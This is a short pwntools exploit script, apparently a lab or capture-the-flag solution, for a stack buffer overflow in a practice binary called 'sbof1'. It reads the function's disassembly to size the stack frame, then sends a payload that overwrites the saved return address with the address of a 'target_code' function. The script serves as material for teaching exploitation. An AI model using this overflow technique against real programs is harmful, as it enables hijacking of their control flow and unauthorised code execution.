from pwn import *

context.log_level = 'DEBUG' # set debug logging

p = process("./sbof1")  # load target program
binary = ELF("./sbof1") # analyze the target program

target_code_addr = binary.symbols["target_code"]

p.recvuntil(b"[*] Please input the length of data:\n")
p.sendline(b"128")
p.recvuntil(b"[*] Please input the data:\n")

# prepare the payload
# since disassembly of `func` is 
# P.S. your address of func may be different, nothing to worry
'''
0000000000400797 <func>:
  400797:       55                      push   rbp
  400798:       48 89 e5                mov    rbp,rsp
  40079b:       48 83 ec 50             sub    rsp,0x50
  40079f:       bf 40 09 40 00          mov    edi,0x400940
  4007a4:       e8 77 fe ff ff          call   400620 <puts@plt>
  4007a9:       48 8d 45 fc             lea    rax,[rbp-0x4]
  4007ad:       48 89 c6                mov    rsi,rax
  4007b0:       bf 65 09 40 00          mov    edi,0x400965
  4007b5:       b8 00 00 00 00          mov    eax,0x0
  4007ba:       e8 c1 fe ff ff          call   400680 <__isoc99_scanf@plt>
  4007bf:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
  4007c2:       89 c6                   mov    esi,eax
  4007c4:       bf 68 09 40 00          mov    edi,0x400968
  4007c9:       b8 00 00 00 00          mov    eax,0x0
  4007ce:       e8 5d fe ff ff          call   400630 <printf@plt>
  4007d3:       bf 7b 09 40 00          mov    edi,0x40097b
  4007d8:       e8 43 fe ff ff          call   400620 <puts@plt>
  4007dd:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
  4007e0:       89 c2                   mov    edx,eax
  4007e2:       48 8d 45 b0             lea    rax,[rbp-0x50]
  4007e6:       48 89 c6                mov    rsi,rax
  4007e9:       bf 00 00 00 00          mov    edi,0x0
  4007ee:       e8 5d fe ff ff          call   400650 <read@plt>
  4007f3:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
  4007f6:       89 c6                   mov    esi,eax
  4007f8:       bf 96 09 40 00          mov    edi,0x400996
  4007fd:       b8 00 00 00 00          mov    eax,0x0
  400802:       e8 29 fe ff ff          call   400630 <printf@plt>
  400807:       90                      nop
  400808:       c9                      leave
  400809:       c3                      ret
'''
# therefore
# - frame size is 0x50 since `sub    rsp,0x50`
# - buffer starts at [rbp - 0x50], tills [rbp - 0x10]
# - len starts at [rbp - 0x4]
# that is to say, need extra 0x18 bytes to overflow return address

payload = b""
payload += b"A" * 0x40  # 1. fill 0x40 original size
payload += b"B" * 0x10  # 2. fill other remain space
payload += b"C" * 0x8   # 3. fill frame pointer
payload += p64(target_code_addr)    # 4. fill return address
payload = payload + b"D" * (128 - len(payload)) # 5. padding

p.send(payload)
p.interactive()
